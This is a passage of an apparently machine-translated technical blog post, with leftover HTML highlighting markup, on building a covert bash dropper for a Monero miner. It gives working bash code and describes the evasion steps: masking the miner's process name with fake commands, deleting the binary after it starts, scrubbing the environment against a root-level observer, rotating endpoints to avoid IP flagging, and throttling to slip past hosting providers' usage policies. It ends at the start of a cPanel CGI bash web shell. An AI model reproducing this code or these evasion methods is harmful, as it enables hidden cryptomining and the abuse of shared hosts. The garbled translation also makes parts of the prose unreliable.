            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Спільні процеси доступні з bash<code>v4</code> , вони схожі на роботу, за винятком того, що вони мають назву та власні дескриптори файлів.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Ми пишемо демон, який є тривалим процесом, і ми використовуємо багато дескрипторів файлів, ми дійсно хочемо зробити деякі очищення, щоб уникнути<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Ця функція спирається на<a href=https://ipinfo.io/> ipinfo</a> визначити область робітника, що дозволяє налаштувати певну регіонально залежну логіку,<a href=\assets/posts/geoip.json> geoip.json</a> об’єднує країни в регіони, оскільки ми хочемо регіону вищого рівня і не зацікавлені в конкретній країні.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash підтримує з'єднання tcp, маючи абстракцію над<code>/dev/tcp</code> (також для udp, але більшість, здається, зазвичай вимикається під час збірки, тому ви не можете на нього покладатися). Ці файли - жахлива річ, вони не є частиною linux<code>/dev</code> дерево.<p>Варто згадати також систему блокування для обробки паралельності між завданнями bash. Щоб дозволити декільком завданням працювати із замками, їм усім потрібно надати спільний опис файлу, тому наш<code>locker</code> що також є роботою, її потрібно розпочати, перш ніж інші завдання бажають скористатися замком. Шафка просто читає<code>stdin</code> очікування запитів на блокування, відповідь на<code>stdout</code> залежно від поточного логічного стану, що зберігається у змінній. Я не гарантую, що цей підхід не є расовим, але, здається, працює пристойно, з іншого боку, я виявив, що дескриптори файлів не дуже надійні, оскільки я підозрюю, що є деякі буфери, які не видаляються десь вниз<em> труби</em> і врешті -решт потрапив у безвихідь (це означає, що ви не можете покладатися на те, що шафка завжди дає вам відповідь).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Приберіть своє сміття ... складні програми bash в кінцевому підсумку використовують багато змінних, і якщо ви зловживаєте глобальним простором, він стає роздутим. Якщо ви породжуєте завдання оболонки, вони успадковують усе середовище (яке ефективно дублюється, а не ділиться), ви можете швидко закінчити з башем<code>100M</code> пам'яті, не дуже приємно. Також ми дуже хочемо бути скромними. У нашому сценарії розгортання противник<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> потенційно можуть мати root -доступ і повну інформацію про наші процеси<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , і ви знаєте ... кожен процес містить інформацію про повну команду, яка його розпочала, та про експортовані змінні середовища.<h2 id=configuration><a class=header-anchor href=#configuration> Конфігурація</a></h2><p>Після того, як у нас є наше середовище та наші інструменти, ми повинні налаштувати наш майнер на машину, на якій він працює, кроки конфігурації у псевдокоді:<ul><li><p>ім'я процесу для майнера<li><p>інформація про хост (оперативна пам'ять/ядра/кеші/<code>ENV_VARS</code>)<li><p>версія конфігурації<li><p><code>worker_id</code> для майнера (з ip та хосту)<li><p>ip/port для підключення</ul><p>Для вибору назви процесу потрібно<em> сховатись</em> той факт, що ми запускаємо майнер, але ми не просто перейменуємо наш двійковий файл, у нас є список<strong> маски</strong> для потенційних кандидатів (звичайний текстовий файл, де кожен рядок є маскою):<ul><li><p>виберіть маску навмання<li><p>перемішати елементи хвоста рядка (усі, крім першого), щоб отримати різноманітну команду процесу. Тепер у нас є рядок, схожий на<code>cmd --arg2 --arg1 --arg3</code> . Це наша маска майнера, ми запускаємо двійковий файл<em> без</em> аргументи, але, схоже, ми розпочали команду<code>cmd</code> з аргументами<code>--arg1 --arg2 --arg3</code> . У іменах файлів дозволені пробіли та тире, тому добре запускати двійковий файл з такою назвою, здається, що Linux не розрізняє виконуваний файл та аргументи під час зберігання команд процесу.<p>Конфігурація майнера автоматично завантажується з<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Хешрейт</a></h3><p>, з часом майнер висхідного потоку отримав багато<strong> автоматична настройка</strong> функцій, тому це зробило частину моїх скриптів зайвими, але відмінність між висхідним та нижчим потоком тут полягає в тому, що мета висхідного напрямку полягає в тому, щоб максимізувати<em> продуктивність</em> , а наша мета - максимізувати<em> ефективність та затьмареність</em> , ми не хочемо обганяти систему, ми хочемо трішки випивати без перебоїв у обслуговуванні.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Для цього нам потрібно більш детальне розуміння навколишнього середовища<code>l2/l3</code> структура кешу процесора, оперативної пам’яті та ядер, а також поточний процесор<em> середній</em> навантаження та процесор<em> використання</em>. Я намагався побудувати<a href=https://en.wikipedia.org/wiki/Finite-state_machine> державна машина</a> in bash, що починалося б з мінімуму і пробувало різні конфігурації, які повільно осідали в середньому. Це було<strong> величезний</strong> марнування зусиль<a href=https://en.wikipedia.org/wiki/Technical_debt> технічний борг</a> який дуже швидко збанкрутував і був переважно відкинутий, а в кодовій базі залишилися лише залишки.<p>Зламайте всю цю автоматичну настройку jumbo, ми щойно заснули майнер залежно від використання/навантаження хосту, це вимагало модифікації майнера для<code>sleep</code> між потоками дає потік і кілька виправлень для сторожового контролера конфігурації<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , що дозволило б нам перезавантажити кількість сну під час виконання. Логіка набагато спрощена і виглядає так:<ul><li><p>якщо використання вище/нижче $ TARGET_USAGE (± межа похибки), збільште/зменшіть режим сну<li><p>якщо середнє навантаження всередині<code>1m</code> вище/нижче $ TARGET_LOAD призупинити/відновити майнінг</ul><h3 id=connection><a class=header-anchor href=#connection> З'єднання</a></h3><p>У нашому огляді bash ми показали утиліти для підключення. Навіщо вони нам потрібні? Тому що нам потрібна різноманітність; просто жорстке кодування кінцевої точки до конфігурації триватиме недовго, коли щось виглядає підозрілим та має мережеву активність, IP -адреси позначаються.<p>Спочатку ми експериментували з кількома методами:<ul><li><p>використовуючи<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> проксі -ланцюги</a> для перевантаження мережевих дзвінків майнера, але це вимагало, щоб майнер був побудований з динамічними бібліотеками, і вам потрібно було доставити їх з корисним навантаженням, тому це було недоцільно.<li><p>біг a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> передній тунель</a> пліч -о -пліч з майнером: це мало багато накладних витрат на конфігурацію, оскільки зараз ми налаштовували два процеси в кожному розгортанні, що призвело до більшої кількості помилок.</ul><p>В кінці ми вирішили просто доставити список кінцевих точок, що зберігаються у змінних bash, вибравши одну випадково. З'єднання, звичайно, були зашифровані. Що це за кінцеві точки? Експедитори до довіреної особи, яка буде обробляти роботу шахтарів.<p>Навіщо нам потрібен а<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> майнінг -проксі</a> ? Я ніколи не проходив повз ~ 100 одночасних з'єднань, тому проксі не був дійсно необхідним для завантаження мережі, але це було зручно для узгодження алгоритму хешування та надання різних цілей складності різним майнерам, щоб запобігти майнерам працювати над<strong> труднощі</strong> цілі, на виконання яких у них буде надто багато часу, щоб уникнути ризику витрачати обчислення на незавершені роботи.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Програмне забезпечення пулу також вимагало кількох модифікацій, оскільки воно із задоволенням рекламувало бути проксі -сервером на простих запитах http ...<em> це потрібно було вичерпати</em> , а виделка додала контроль доступу, тому ми базували наші моди на цьому.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Редагування json</a></h3><p>Застосування модифікацій до файлу json за допомогою просто bash ми отримали з деякою заміною env var та деяким регулярним виразом. Спочатку ми покладалися на<code>envsubst</code> binary, щоб застосувати змінні, тоді ми пішли на повний баш<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> з такою логікою:<ul><li><p>прочитати шаблон конфігурації<li><p>замінити всі лапки дуже езотеричним рядком (наприклад<code>_#_#</code>)<li><p><code>eval</code> шаблон<li><p>замінити всі езотеричні випадки назад лапками</ul><p>Крім уникнення підпроцесів, ще однією перевагою є те, що ми отримуємо повну можливість башування у своїх шаблонах. Для читання та письма без шаблонів ми повинні покладатися на можливості bash регулярного виразу:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Це дозволяє лише редагувати окремі рядки, для багаторядкових записів він просто враховує перший рядок .. але це досить добре для нашого варіанту використання.<h2 id=runtime><a class=header-anchor href=#runtime> Виконання</a></h2><p>Як виглядає наш час виконання? У нас є основний процес bash, який виконує основний цикл, потім підпроцес майнера, підпроцес монітора процесора, шафку і тюнер. Це майже жменька.<p>По -перше, ми хочемо переконатися, що якщо щось піде не так, ми не залишимо безладу, це означає, що ми використовуємо пастку bash для виконання очищення після завершення<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> видаляє пастку, щоб запобігти повторенню. Пастка вбиває всі робочі місця та видаляє робоче середовище.<p>Настав час запустити майнер, який зберігається як змінна bash у кодуванні base64. Ми скидаємо його у файлову систему, потім скидаємо конфігурацію, виконуємо майнер і видаляємо і майнер, і конфігурацію. У Linux можна видалити виконуваний файл запущеного процесу (у Windows це заборонено).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Коли майнер працює, у файловій системі є лише файл<code>.. /</code> каталог з<code>b64</code> посилання в ньому.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Шалена дивина, з якою стикається bash під час кодування майнера, полягає в тому, що присвоєння змінної з підоболонкою з лапками<code>myvar="$(something)"</code> викликає постійне збільшення використання пам’яті, це було важко налагодити і насправді не знайшли причини, чому поводиться так, у будь -якому випадку призначення має бути не цитованим. Натомість декодування виконується за допомогою<em> нитки</em> яка є абстракцією над тимчасовими файлами, змінна скидається у файл, який потім подається назад у процес.<p>Довгобіговий цикл майнера:<ul><li><p>поки правда<ul><li><p>зупинити майнера<li><p>видалити config<li><p>запустити майнер<li><p>поки правда<ul><li><p>запустити демон<ul><li><p>під час роботи майнера<ul><li><p>прочитати вихідні дані з майнера<li><p>виберіть дію майнера на основі вихідної лінії</ul></ul><li><p>якщо майнер не працює: break</ul><li><p>спати</ul></ul><p>Вихідний рядок зіставляється з деяким регулярним виразом:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Демон обробляє випадки, коли<ul><li><p>з'єднання з кінцевою точкою дає помилки (виберіть нову випадкову кінцеву точку)<li><p>зміни алгоритму хешування (налаштування часу сну та спеціальних конфігурацій)<li><p>проблеми майнера (перезавантажте майнер).</ul><p>Деякий час існувала підтримка панелі керування та керування, яка дозволяла запускати ручні перезавантаження, проте оскільки її використання було мінімальним, її було відкинуто, а її кінцеві точки замінено на альтернативне підключення до пулу, а також процес перезапуску був нестабільним, складним. ..ще один випадок технічного боргу. Однак це дозволило заново завантажити оновлене корисне навантаження та заново налаштувати всі конфігурації на льоту, що було дуже круто, кінцевий батут.<h2 id=debugging><a class=header-anchor href=#debugging> Налагодження</a></h2><p>Існує три основні утиліти<ul><li><p>увімкнути/вимкнути трасування навколо кодових блоків (ми не хочемо відстежувати двійковий код, кодований b64, у змінній ..)<li><p>проста функція форматування журналів<li><p>прапор, який активуватиме детальне ведення журналу під час виконання кожного разу при запуску майнера.<ul><li><p>робить файл<code>.debug</code> існує?<ul><li><p>увімкнути детальне ведення журналу</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Цільове розгортання</a></h2><p>Ця установка була перевірена на трьох типах хостів:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Саморозміщені контейнери або віртуальні машини</a></h3><p>Багатьом хостинг -провайдерам не подобається майнінг, оскільки ресурси центрального процесора, як правило, розподіляються між кількома користувачами, а програмне забезпечення для майнінгу може легко уповільнити хост -вузол, що впливає на продуктивність для решти користувачів. Це може бути правдою, навіть якщо час користувача процесора необмежений, оскільки алгоритми хешування можуть наситити всі шари кешування процесора, якщо кеш є спільним для всіх ядер процесора.<p>Ми хотіли б скористатися нашою<em> справедливий</em> частка ресурсів без заборони, це хороший варіант використання для нашої крапельниці, оскільки вона знає про використання хосту, а це означає, що<em> слід</em> перебувати в межах [AUP]. Немає додаткових кроків при роботі з самостійними розгортаннями, лише сценарій запуску, який можна додати до послідовності завантаження або запустити вручну.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> веб -хостинг на базі cPanel</a></h3><p>Плани передплати веб -хостингу в основному пропонуються через [cPanel]. Знову ж таки, тут ми використовуємо особисті плани підписки, які мають розумні обмеження ресурсів, з іншого боку, будь -який безкоштовний план має смішні обмеження<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel дозволяє визначати обробники для різних розширень файлів, це дозволяє нам виконувати сценарії оболонки через<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> з http -запитом проти сценарію оболонки, завантаженого на сервер. Такі інтерфейси виглядають як веб-оболонки<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Проста веб -оболонка bash<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
